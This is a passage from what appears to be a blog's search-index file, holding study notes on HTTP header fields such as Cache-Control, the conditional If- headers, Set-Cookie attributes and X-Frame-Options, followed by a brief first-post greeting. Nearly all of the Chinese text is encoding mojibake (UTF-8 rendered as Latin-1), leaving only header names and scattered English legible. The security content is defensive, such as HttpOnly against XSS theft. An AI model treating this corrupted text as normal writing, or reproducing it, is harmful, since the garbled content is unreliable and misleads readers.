ï¼šä»¥å…³é”®è¯æ£€ç´¢å¤šä¸ªæ•°æ®åº“ä½¿ç”¨çš„åè®® </p><p>â€‹Gopher ï¼šæŸ¥æ‰¾ä¸äº’è”ç½‘è¿æ¥çš„è®¡ç®—æœºå†…ä¿¡æ¯çš„åè®® </p><h3 id="HTTPé¦–éƒ¨"><a href="#HTTPé¦–éƒ¨" class="headerlink" title="HTTPé¦–éƒ¨"></a>HTTPé¦–éƒ¨</h3><p>â€‹é¦–éƒ¨å­—æ®µç»“æ„ï¼šæ‰‹æ®µå­—æ®µåï¼šå­—æ®µå€¼</p><h5 id="é€šç”¨é¦–éƒ¨"><a href="#é€šç”¨é¦–éƒ¨" class="headerlink" title="é€šç”¨é¦–éƒ¨"></a>é€šç”¨é¦–éƒ¨</h5><pre class="language-none"><code class="language-none">**Cache-Control æ§åˆ¶ç¼“å­˜çš„è¡Œä¸º**æŒ‡ä»¤:public è¡¨æ˜å…¶ä»–ç”¨æˆ·ä¹Ÿå¯åˆ©ç”¨ç¼“å­˜ private å“åº”åªèƒ½ä»¥ç‰¹æ®Šç”¨æˆ·ä½œä¸ºå¯¹è±¡ no-cache ç”¨æˆ·ç«¯ä¸æ¥å—ç¼“å­˜è¿‡çš„å“åº”ï¼Œç¼“å­˜æœåŠ¡å™¨ä¸èƒ½è¿›è¡Œç¼“å­˜ no-store è¡¨æ˜è¯·æ±‚å’Œå“åº”ä¸­åŒ…å«æœºå¯†ä¿¡æ¯ï¼Œä¸èƒ½è¿›è¡Œç¼“å­˜ s-maxage=...ï¼ˆç§’ï¼‰    æŒ‡å®šç¼“å­˜æœŸé™å’Œè®¤è¯çš„æŒ‡ä»¤ min-fresh=...ï¼ˆç§’ï¼‰æŒ‡ç¤ºå®¢æˆ·ç«¯å…è®¸å­˜å‚¨çš„å“åº”è‡³å°‘ N ç§’æ˜¯æ–°é²œçš„ max-stale=...ï¼ˆç§’ï¼‰å¯æŒ‡ç¤ºç¼“å­˜èµ„æºï¼Œå¤„äºæŒ‡å®šèŒƒå›´å†…ï¼Œè¿‡æœŸä¹Ÿå¯ä»¥æ¥å—ã€‚ only-if-cachedå®¢æˆ·ç«¯ä»…åœ¨ç¼“å­˜æœåŠ¡å™¨æœ¬åœ°ç¼“å­˜ç›®æ ‡èµ„æºçš„æƒ…å†µä¸‹æ‰ä¼šè¦æ±‚å…¶è¿”å› mustâ€”revalidateä»£ç†ä¼šå‘æºæœåŠ¡å™¨å†æ¬¡éªŒè¯å³å°†è¿”å›çš„å“åº”ç¼“å­˜ç›®å‰æ˜¯å¦ä»ç„¶æœ‰æ•ˆã€‚ proxy-revalidateç¼“å­˜æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯å¸¦æœ‰è¯¥æŒ‡ä»¤çš„è¯·æ±‚è¿”å›å“åº”ä¹‹å‰ï¼Œå¿…é¡»å†æ¬¡éªŒè¯ç¼“å­˜çš„æœ‰æ•ˆæ€§ no-transform ç¼“å­˜éƒ½ä¸èƒ½æ”¹å˜å®ä½“ä¸»ä½“çš„åª’ä½“ç±»å‹ **Connection é€è·³é¦–éƒ¨ã€è¿æ¥çš„ç®¡ç†**æŒ‡ä»¤close æœåŠ¡å™¨æƒ³æ–­å¼€è¿æ¥ Keep-Alive æ—§ç‰ˆæœ¬httpåè®®å®ç°æŒä¹…åŒ–è¿æ¥**Date åˆ›å»ºæŠ¥æ–‡çš„æ—¥æœŸæ—¶é—´**æ ¼å¼ï¼šå¦‚Tue, 03 Jul 2012 04:40:59 GMæˆ–è€…Tue Jul 03 04:40:59 2012**Pragma æŠ¥æ–‡æŒ‡ä»¤**æŒ‡ä»¤ï¼šno-cache åªåœ¨å®¢æˆ·ç«¯è¯·æ±‚ä¸­ï¼Œæ‰€æœ‰ä¸­é—´æœåŠ¡å™¨ä¸è¿”å›ç¼“å­˜èµ„æº**Trailer æŠ¥æ–‡æœ«ç«¯çš„é¦–éƒ¨ä¸€è§ˆ**å…è®¸å‘é€æ–¹åœ¨åˆ†å—å‘é€çš„æ¶ˆæ¯åé¢æ·»åŠ é¢å¤–çš„å…ƒä¿¡æ¯**Transfer-Encoding æŒ‡å®šæŠ¥æ–‡ä¸»ä½“çš„ä¼ è¾“ç¼–ç æ–¹å¼****Upgrade å‡çº§ä¸ºå…¶ä»–åè®®****Via ä»£ç†æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯**è¿½è¸ªæŠ¥æ–‡ä¼ è¾“è·¯å¾„**Warning é”™è¯¯é€šçŸ¥**æ ¼å¼ï¼š[è­¦å‘Šç ][è­¦å‘Šçš„ä¸»æœº:ç«¯å£å·]â€œ[è­¦å‘Šå†…å®¹]â€([æ—¥æœŸæ—¶é—´])</code></pre><h5 id="è¯·æ±‚é¦–éƒ¨å­—æ®µ"><a href="#è¯·æ±‚é¦–éƒ¨å­—æ®µ" class="headerlink" title="è¯·æ±‚é¦–éƒ¨å­—æ®µ"></a>è¯·æ±‚é¦–éƒ¨å­—æ®µ</h5><pre class="language-none"><code class="language-none">é¦–éƒ¨å­—æ®µå è¯´æ˜**Accept ç”¨æˆ·ä»£ç†å¯å¤„ç†çš„åª’ä½“ç±»å‹**q=ï¼ˆ0-1ï¼‰ç”¨æ¥æƒè¡¡ä¼˜å…ˆçº§ï¼Œé»˜è®¤ä¸º1ï¼Œå‰ç”¨ï¼›é—´éš”**Accept-Charset ä¼˜å…ˆçš„å­—ç¬¦é›†****Accept-Encoding ä¼˜å…ˆçš„å†…å®¹ç¼–ç **å†…å®¹ç¼–ç ä¼˜å…ˆçº§**Accept-Language ä¼˜å…ˆçš„è¯­è¨€ï¼ˆè‡ªç„¶è¯­è¨€ï¼‰****Authorization Webè®¤è¯ä¿¡æ¯****Expect æœŸå¾…æœåŠ¡å™¨çš„ç‰¹å®šè¡Œä¸º**é”™è¯¯è¿”å›çŠ¶æ€ç 417 Expectation Failed**From ç”¨æˆ·çš„ç”µå­é‚®ç®±åœ°å€****Host è¯·æ±‚èµ„æºæ‰€åœ¨æœåŠ¡å™¨****If-Match æ¯”è¾ƒå®ä½“æ ‡è®°ï¼ˆETagï¼‰**If-xxx ä¸ºæ¡ä»¶è¯·æ±‚ï¼Œæ¡ä»¶ä¸ºçœŸæ—¶æ‰§è¡Œ*If-Modified-Since æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´*å¦‚æœè¯·æ±‚çš„èµ„æºéƒ½æ²¡æœ‰è¿‡æ›´æ–°ï¼Œåˆ™è¿”å›çŠ¶æ€ç  304 Not Modified çš„å“åº”**If-None-Match æ¯”è¾ƒå®ä½“æ ‡è®°ï¼ˆä¸ If-Match ç›¸åï¼‰****If-Range èµ„æºæœªæ›´æ–°æ—¶å‘é€å®ä½“ Byte çš„èŒƒå›´è¯·æ±‚**If-Unmodified-Since æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ï¼ˆä¸If-Modified-Sinceç›¸åï¼‰å¦‚æœåœ¨æŒ‡å®šæ—¥æœŸæ—¶é—´åå‘ç”Ÿäº†æ›´æ–°ï¼Œåˆ™ä»¥çŠ¶æ€ç  412 Precondition Failed ä½œä¸ºå“åº”è¿”å›ã€‚**Max-Forwards æœ€å¤§ä¼ è¾“é€è·³æ•°**å½“å€¼ä¸º0æ—¶ï¼Œç»è¿‡çš„æœåŠ¡å™¨ä¸åœ¨è¿›è¡Œè½¬å‘ï¼Œç›´æ¥è¿”å›å“åº”**Proxy-Authorization ä»£ç†æœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯****Range å®ä½“çš„å­—èŠ‚èŒƒå›´è¯·æ±‚****Referer å¯¹è¯·æ±‚ä¸­URIçš„åŸå§‹è·å–æ–¹****TE ä¼ è¾“ç¼–ç çš„ä¼˜å…ˆçº§****User-Agent å®¢æˆ·ç«¯ç¨‹åºçš„ä¿¡æ¯**å°†åˆ›å»ºçš„è¯·æ±‚çš„æµè§ˆå™¨å’Œç”¨æˆ·ä»£ç†åç§°ç­‰ä¿¡æ¯ä¼ è¾¾ç»™æœåŠ¡å™¨</code></pre><h5 id="å“åº”é¦–éƒ¨å­—æ®µ"><a href="#å“åº”é¦–éƒ¨å­—æ®µ" class="headerlink" title="å“åº”é¦–éƒ¨å­—æ®µ"></a>å“åº”é¦–éƒ¨å­—æ®µ</h5><pre class="language-none"><code class="language-none">é¦–éƒ¨å­—æ®µå    è¯´æ˜**Accept-Ranges æ˜¯å¦æ¥å—å­—èŠ‚èŒƒå›´è¯·æ±‚****Age æ¨ç®—èµ„æºåˆ›å»ºç»è¿‡æ—¶é—´****ETag èµ„æºçš„åŒ¹é…ä¿¡æ¯**ç”¨æˆ·ç«¯å®ä½“æ ‡è¯†**Location ä»¤å®¢æˆ·ç«¯é‡å®šå‘è‡³æŒ‡å®šURI****Proxy-Authenticate ä»£ç†æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯**æœåŠ¡å™¨æ˜¯å®‰è£…httpæœåŠ¡å™¨çš„åº”ç”¨ç¨‹åºæ˜¯ä¿¡æ¯**Retry-After å¯¹å†æ¬¡å‘èµ·è¯·æ±‚çš„æ—¶æœºè¦æ±‚****Server     HTTPæœåŠ¡å™¨çš„å®‰è£…ä¿¡æ¯**æœåŠ¡å™¨æ˜¯å®‰è£…httpæœåŠ¡å™¨çš„åº”ç”¨ç¨‹åºæ˜¯ä¿¡æ¯**Vary ä»£ç†æœåŠ¡å™¨ç¼“å­˜çš„ç®¡ç†ä¿¡æ¯****WWW-Authenticate æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯**httpè®¿é—®è®¤è¯</code></pre><h5 id="å®ä½“é¦–éƒ¨å­—æ®µ"><a href="#å®ä½“é¦–éƒ¨å­—æ®µ" class="headerlink" title="å®ä½“é¦–éƒ¨å­—æ®µ"></a>å®ä½“é¦–éƒ¨å­—æ®µ</h5><pre class="language-none"><code class="language-none">é¦–éƒ¨å­—æ®µå è¯´æ˜**Allow èµ„æºå¯æ”¯æŒçš„HTTPæ–¹æ³•****Content-Encoding å®ä½“ä¸»ä½“é€‚ç”¨çš„ç¼–ç æ–¹å¼****Content-Language å®ä½“ä¸»ä½“çš„è‡ªç„¶è¯­è¨€****Content-Length å®ä½“ä¸»ä½“çš„å¤§å°ï¼ˆå•ä½ï¼šå­—èŠ‚ï¼‰****Content-Location æ›¿ä»£å¯¹åº”èµ„æºçš„URI****Content-MD5 å®ä½“ä¸»ä½“çš„æŠ¥æ–‡æ‘˜è¦**åˆ¤æ–­æŠ¥æ–‡çš„å‡†ç¡®æ€§**Content-Range å®ä½“ä¸»ä½“çš„ä½ç½®èŒƒå›´****Content-Type å®ä½“ä¸»ä½“çš„åª’ä½“ç±»å‹****Expires å®ä½“ä¸»ä½“è¿‡æœŸçš„æ—¥æœŸæ—¶é—´****Last-Modified èµ„æºçš„æœ€åä¿®æ”¹æ—¥æœŸæ—¶é—´**</code></pre><h5 id="ä¸º-Cookie-æœåŠ¡çš„é¦–éƒ¨å­—æ®µ"><a href="#ä¸º-Cookie-æœåŠ¡çš„é¦–éƒ¨å­—æ®µ" class="headerlink" title="ä¸º Cookie æœåŠ¡çš„é¦–éƒ¨å­—æ®µ"></a>ä¸º Cookie æœåŠ¡çš„é¦–éƒ¨å­—æ®µ</h5><pre class="language-none"><code class="language-none">**Set-Cookie**expires:æµè§ˆå™¨å¯å‘é€cookieçš„æœ‰æ•ˆæœŸpathï¼šé™å®šcookieå‘é€èŒƒå›´çš„æ–‡ä»¶ç›®å½•domainï¼šæŒ‡å®šåŸŸåä¸ç»“å°¾åŒ¹é…å¯å‘é€cookiesecureï¼šwebä»…åœ¨HTTPSæ—¶ï¼Œæ‰å‘é€cookieHttpOnlyï¼šä½¿JavaScriptæ— æ³•è·å–cookieï¼Œé˜²æ­¢xssæ”»å‡»å¯¹ä¿¡æ¯çš„çªƒå–</code></pre><h5 id="å…¶ä»–é¦–éƒ¨å­—æ®µ"><a href="#å…¶ä»–é¦–éƒ¨å­—æ®µ" class="headerlink" title="å…¶ä»–é¦–éƒ¨å­—æ®µ"></a>å…¶ä»–é¦–éƒ¨å­—æ®µ</h5><pre class="language-none"><code class="language-none">**X-Frame-Options ç”¨äºæ§åˆ¶ç½‘ç«™å†…å®¹åœ¨å…¶ä»– Web ç½‘ç«™çš„ Frame æ ‡ç­¾å†…çš„æ˜¾ç¤ºé—®é¢˜ **å“åº”é¦–éƒ¨DENYï¼šæ‹’ç»SAMEORIGINï¼šä»…åŒåŸŸåä¸‹é¡µé¢åŒ¹é…æ—¶è®¸å¯**X-XSS-Protection äºæ§åˆ¶æµè§ˆå™¨ XSS é˜²æŠ¤æœºåˆ¶çš„å¼€å…³**å“åº”é¦–éƒ¨0ï¼šæ— æ•ˆ1ï¼š æœ‰æ•ˆ**DNT æ‹’ç»ä¸ªäººä¿¡æ¯è¢«æ”¶é›†**è¯·æ±‚é¦–éƒ¨0ï¼šåŒæ„è¢«è·Ÿè¸ª1ï¼šæ‹’ç»è¢«è·Ÿè¸ª*P3P åœ¨çº¿éšç§åå¥½å¹³å°**</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> webåŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/07/19/hello-world/"/>
      <url>/2023/07/19/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¬¬ä¸€ç¯‡åšå®¢"><a href="#ç¬¬ä¸€ç¯‡åšå®¢" class="headerlink" title="ç¬¬ä¸€ç¯‡åšå®¢"></a>ç¬¬ä¸€ç¯‡åšå®¢</h2><p>â€‹ä¸çŸ¥é“æ€ä¹ˆçœ‹åˆ«äººå¤§ä½¬çš„æ–‡ç« éƒ½æ˜¯å¥½çœ‹çš„åšå®¢ï¼Œä¹Ÿéå¸¸ç³»ç»Ÿï¼Œç„¶åå°±æƒ³å»ºä¸ªè‡ªå·±çš„åšå®¢ã€‚æˆåŠŸæ­å»ºåšå®¢ç³»ç»Ÿã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
